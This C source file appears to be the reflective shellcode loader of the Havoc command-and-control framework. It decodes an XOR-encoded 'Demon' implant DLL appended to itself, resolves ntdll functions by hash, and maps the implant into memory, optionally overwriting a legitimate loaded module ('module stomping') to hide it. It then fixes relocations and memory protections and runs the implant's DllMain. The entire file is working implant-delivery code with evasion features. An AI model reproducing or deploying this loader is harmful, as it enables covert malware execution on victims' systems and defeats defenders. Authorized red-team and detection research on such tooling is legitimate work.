#include <Core.h>
#include <Win32.h>
#include <ntdef.h>

#ifdef _WIN64
#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
#else
#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

// markers the teamserver locates & patches in the shellcode template to enable
// module stomping and set the decoy module name at build time.
#define STOMP_TARGET_MARKER     L"HAVOC_STOMP_TARGET"
#define STOMP_ENABLED_MARKER    0x0D

// marker the teamserver patches with the payload-encoding key at build time
#define CRYPT_KEY_MARKER        "HAVOC_CRYPT_KEY_MARKER"

SEC( text, B ) WCHAR gStompTarget[ STOMP_TARGET_LEN ] = STOMP_TARGET_MARKER;
SEC( text, B ) BYTE  gStompEnabled                    = STOMP_ENABLED_MARKER;
SEC( text, B ) CHAR  gCryptKey[ CRYPT_KEY_LEN ]       = CRYPT_KEY_MARKER;

SEC( text, B ) VOID Entry( VOID )
{
    INSTANCE                Instance        = { 0 };
    HMODULE                 KaynLibraryLdr  = NULL;
    PIMAGE_NT_HEADERS       NtHeaders       = NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
    LPVOID                  KVirtualMemory  = NULL;
    DWORD                   KMemSize        = 0;
    DWORD                   KHdrSize        = 0;
    PVOID                   SecMemory       = NULL;
    PVOID                   SecMemorySize   = 0;
    DWORD                   Protection      = 0;
    ULONG                   OldProtection   = 0;
    PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;
    KAYN_ARGS               KaynArgs        = { 0 };
    BOOL                    Mapped          = FALSE;

    LPVOID                  StompBase       = NULL;
    SIZE_T                  StompSize       = 0;
    PIMAGE_NT_HEADERS       StompNt         = NULL;

    // 0. First we need to get our own image base
    KaynLibraryLdr          = KaynCaller();
    Instance.Modules.Ntdll  = LoaderModPebbb( NTDLL_HASH );

    Instance.Win32.LdrLoadDll              = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRLOADDLL );
    Instance.Win32.LdrGetDllHandle         = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_LDRGETDLLHANDLE );
    Instance.Win32.NtAllocateVirtualMemory = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTALLOCATEVIRTUALMEMORY );
    Instance.Win32.NtProtectVirtualMemory  = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTPROTECTEDVIRTUALMEMORY );
    Instance.Win32.NtFreeVirtualMemory     = LoaderFuncAdd( Instance.Modules.Ntdll, SYS_NTFREEVIRTUALMEMORY );

    NtHeaders = C_PTR( KaynLibraryLdr + ( ( PIMAGE_DOS_HEADER ) KaynLibraryLdr )->e_lfanew );
    SecHeader = IMAGE_FIRST_SECTION( NtHeaders );
    KHdrSize  = SecHeader[ 0 ].VirtualAddress;
    KMemSize  = NtHeaders->OptionalHeader.SizeOfImage - KHdrSize;

    // Decode the appended (XOR keystream) Demon DLL in place. the teamserver
    // patched gCryptKey at build time; the encoded DLL directly follows this
    // loader image in memory. the raw template size is (RawEnd - RawStart):
    // the same offset the teamserver appends the encoded DLL at.
    {
        DWORD   RawSize  = 0;
        DWORD   RawStart = SecHeader[ 0 ].PointerToRawData;
        LPVOID  DllStart = NULL;
        DWORD   DllSize  = 0;

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            DWORD End = SecHeader[ i ].PointerToRawData + SecHeader[ i ].SizeOfRawData;
            if ( End > RawSize )
                RawSize = End;
        }
        RawSize -= RawStart;

        DllStart = C_PTR( KaynLibraryLdr + RawSize );
        DllSize  = KHdrSize + KMemSize;

        CryptDecodeBuffer( DllStart, DllSize, gCryptKey, CRYPT_KEY_LEN - 1 );
    }

    // Optional module stomping: overwrite a legitimate, already-loaded module
    // image with our payload. enabled per-build by the teamserver (gStompEnabled).
    if ( gStompEnabled == 1 )
    {
        U_STRING StompName = { 0 };

        StompName.Buffer        = gStompTarget;
        StompName.Length        = ( USHORT )( STOMP_TARGET_LEN - 1 ) * sizeof( WCHAR );
        StompName.MaximumLength = ( USHORT )( STOMP_TARGET_LEN ) * sizeof( WCHAR );
        if ( ! NT_SUCCESS( Instance.Win32.LdrGetDllHandle( NULL, NULL, &StompName, &StompBase ) ) )
            Instance.Win32.LdrLoadDll( NULL, NULL, &StompName, &StompBase );

        if ( StompBase )
        {
            StompNt   = C_PTR( StompBase + ( ( PIMAGE_DOS_HEADER ) StompBase )->e_lfanew );
            StompSize = StompNt->OptionalHeader.SizeOfImage;

            // only stomp if the target can hold the entire payload image
            if ( StompSize >= NtHeaders->OptionalHeader.SizeOfImage )
            {
                KVirtualMemory = StompBase;
                KHdrSize       = 0;
                KMemSize       = NtHeaders->OptionalHeader.SizeOfImage;
                Mapped         = TRUE;
            }
        }
    }

    if ( ! Mapped && NT_SUCCESS( Instance.Win32.NtAllocateVirtualMemory( NtCurrentProcess(), &KVirtualMemory, 0, &KMemSize, MEM_COMMIT, PAGE_READWRITE ) ) )
        Mapped = TRUE;

    if ( Mapped )
    {
        // TODO: find the base address of this shellcode in a better way?
        KaynArgs.KaynLdr   = ( PVOID ) ( ( ( ULONG_PTR )KaynLibraryLdr ) & ( ~ ( PAGE_SIZE - 1 ) ) );
        KaynArgs.DllCopy   = KaynLibraryLdr;
        KaynArgs.Demon     = KVirtualMemory;
        KaynArgs.DemonSize = KMemSize;

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            // when stomping, the destination pages are not writable: flip them first
            if ( gStompEnabled == 1 )
            {
                SecMemory     = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress );
                SecMemorySize = SecHeader[ i ].SizeOfRawData;

                if ( ! NT_SUCCESS( Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_READWRITE, &OldProtection ) ) )
                    continue;
            }

            MemCopy(
                C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize ), // Section New Memory
                C_PTR( KaynLibraryLdr + SecHeader[ i ].PointerToRawData ),          // Section Raw Data
                SecHeader[ i ].SizeOfRawData                                        // Section Size
            );
        }

        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
        if ( ImageDir->VirtualAddress )
            KaynLdrReloc( KVirtualMemory, NtHeaders->OptionalHeader.ImageBase, C_PTR( KVirtualMemory + ImageDir->VirtualAddress ), KHdrSize );

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            SecMemory       = C_PTR( KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize );
            SecMemorySize   = SecHeader[ i ].SizeOfRawData;
            Protection      = 0;
            OldProtection   = 0;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_READWRITE;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
            {
                Protection = PAGE_EXECUTE_READ;
                KaynArgs.TxtBase = KVirtualMemory + SecHeader[ i ].VirtualAddress - KHdrSize;
                KaynArgs.TxtSize = SecHeader[ i ].SizeOfRawData;
            }

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READWRITE;

            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, Protection, &OldProtection );
        }

        // when stomping: trim the decoy's trailing pages and restore RX over the image
        if ( gStompEnabled == 1 )
        {
            if ( StompSize > NtHeaders->OptionalHeader.SizeOfImage )
                Instance.Win32.NtFreeVirtualMemory( NtCurrentProcess(), &KVirtualMemory, &( SIZE_T ){ StompSize - NtHeaders->OptionalHeader.SizeOfImage }, MEM_RELEASE );

            SecMemory     = KVirtualMemory;
            SecMemorySize = NtHeaders->OptionalHeader.SizeOfImage;
            Instance.Win32.NtProtectVirtualMemory( NtCurrentProcess(), &SecMemory, &SecMemorySize, PAGE_EXECUTE_READ, &OldProtection );
        }

        // --------------------------------
        // 6. Finally executing our DllMain
        // --------------------------------
        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + NtHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, &KaynArgs );
    }
}

VOID KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWORD KHdrSize )
{
    PIMAGE_BASE_RELOCATION  pImageBR = C_PTR( BaseRelocDir - KHdrSize );
    LPVOID                  OffsetIB = C_PTR( U_PTR( KaynImage - KHdrSize ) - U_PTR( ImageBase ) );
    PIMAGE_RELOC            Reloc    = NULL;

    while( pImageBR->VirtualAddress != 0 )
    {
        Reloc = ( PIMAGE_RELOC ) ( pImageBR + 1 );

        while ( ( PBYTE ) Reloc != ( PBYTE ) pImageBR + pImageBR->SizeOfBlock )
        {
            if ( Reloc->type == IMAGE_REL_TYPE )
                *( ULONG_PTR* ) ( U_PTR( KaynImage ) + pImageBR->VirtualAddress + Reloc->offset - KHdrSize ) += ( ULONG_PTR ) OffsetIB;

            else if ( Reloc->type != IMAGE_REL_BASED_ABSOLUTE )
                __debugbreak(); // TODO: handle this error

            Reloc++;
        }

        pImageBR = ( PIMAGE_BASE_RELOCATION ) Reloc;
    }
}